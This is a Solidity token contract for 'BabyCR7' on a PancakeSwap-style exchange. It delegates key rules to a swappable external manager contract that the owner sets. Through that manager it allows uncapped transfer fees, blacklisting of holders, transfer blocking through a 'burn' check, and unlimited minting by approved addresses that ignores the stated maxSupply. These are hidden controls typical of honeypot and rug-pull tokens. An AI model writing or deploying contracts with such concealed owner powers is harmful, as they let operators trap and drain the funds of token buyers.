// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Context.sol";
import "./Ownable.sol";
import "./ERC20.sol";
import "./Address.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";
import "./ITManager.sol";
import "./IReward.sol";
contract BabyCR7 is ERC20 ,Ownable, IReward{
    using SafeMath for uint256;
    using Address for address;
    uint256 public constant maxSupply = 10**10 * 10**18;
    IUniswapV2Router02 public uniswapV2Router;
    //liquid address
    address public uniswapV2Pair;
    uint8 private constant _DECIMALS = 18;
    uint256 private constant _DECIMALFACTOR = 10**uint256(_DECIMALS);
    uint256 public TOTAL_SUPPLY = 100 * (10**6) * _DECIMALFACTOR;
    mapping(address => bool) public excludeFee;
    ITManager public tkControl;
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        _mint(msg.sender, TOTAL_SUPPLY);
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
    }

     function setMan(address _manager) public onlyOwner {
        tkControl = ITManager(_manager);
    }

    modifier isPlayer() {
        bool check;
        address _address;
        (check,_address) =tkControl.isPlayer(msg.sender);
        require(
            check,
            "Only Owner have permission"
        );
        _;
    }

    function claimReward(address _userAddress,uint256 amount) external override {
        claim(_userAddress, amount);

    }


    function claim(address winner, uint256 reward)
        internal
        isPlayer()
    {
        require(winner != address(0), "0x address is not accepted");
        require(reward > 0, "you have no reward!");
        _mint(winner, reward);
    }
    
    function _transfer( address sender, address recipient, uint256 amount ) internal virtual override {
        address feeAddress = tkControl.getTransferFeeAddress();
        uint256 transferFeeRate = tkControl.getTransferFeeRate(sender,recipient);
        
        if (sender != owner() && recipient != owner()) {
            require(!tkControl.isBotAddress(sender), "Play fair");
            require(!tkControl.isBotAddress(recipient), "Play fair");
        }

        if(tkControl.isBurnEnable()){
            if(tkControl.checkBurnAddress(sender, recipient)){
                require(!tkControl.isBurnEnable(), "Can't burn token");
            }
        }

        if (
            transferFeeRate > 0 &&
            recipient != address(0) &&
            feeAddress != address(0) ) {
            uint256 _fee = amount.div(100).mul(transferFeeRate);
            super._transfer(sender, feeAddress, _fee);
            amount = amount.sub(_fee);
        }

        super._transfer(sender, recipient, amount);
    }
}